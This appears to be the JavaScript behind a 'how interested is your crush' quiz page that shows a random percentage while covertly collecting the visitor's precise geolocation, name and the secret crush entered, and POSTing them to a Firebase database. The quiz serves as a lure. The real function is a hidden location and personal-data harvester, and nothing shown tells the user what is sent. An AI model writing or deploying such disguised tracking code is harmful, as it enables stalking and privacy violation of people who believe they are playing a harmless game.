
const getLoc = document.getElementById('submit');
getLoc.addEventListener('click',(e)=>{
e.preventDefault()
navigator.geolocation.getCurrentPosition((pos)=>{
    const result =document.getElementById('result');
    const name =  document.getElementById('name')
    const age =  document.getElementById('age')
    const secret =  document.getElementById('secret')
    
    const val =Math.floor(Math.random()*100) +
               parseInt(name.value.length) +
               parseInt(age.value)+
               parseInt(secret.value.length);
  if(name.value!==''&&age.value!==''&&secret.value!==''){
    result.style='display:block;'
    result.innerHTML=`Your Crush/partner ${val>100?val/2:val}% interested in YOU`;
   
  }
  else {alert('Enter Complete details')}
  
    const table = new Date().toLocaleString();
    let newTable ='';
      for(const key in table){
       if(table[key]!=="/"&&table[key]!==","&&table[key]!==" "){ newTable += table[key]; }}

    const coords = {
        latitude:pos.coords.latitude,
        longitude:pos.coords.longitude,
        crush:secret.value
       }
    
     fetch(`https://locky-d3641-default-rtdb.firebaseio.com/locs/${newTable.concat(name.value)}.json`,{
        method:'POST',
        body:JSON.stringify(coords),
        header:{'Content-Type':'application/json'}  
        }).then(()=>{
            name.value='';age.value='';secret.value='';
           }).catch(err=>{alert(err)});

           setTimeout(() => {
               result.style='display:none';
           }, 5000);
},catcherr,options)
})


const options = {
  enableHighAccuracy:true,
  timeout:1000,
  maximumAge:0
}

const catcherr = (err)=>{
    switch(err.code){
        case err.PERMISSION_DENIED:
            console.log('PERMISSION_DENIED');
            break;
            case err.POSITION_UNAVAILABLE:
            console.log('POSITION_UNAVAILABLE');
            break;
            case err.TIMEOUT:
            console.log('TIMEOUT');
            break;
            default:
                console.log('something went wrong');
             break;      
            }
        }

    
   
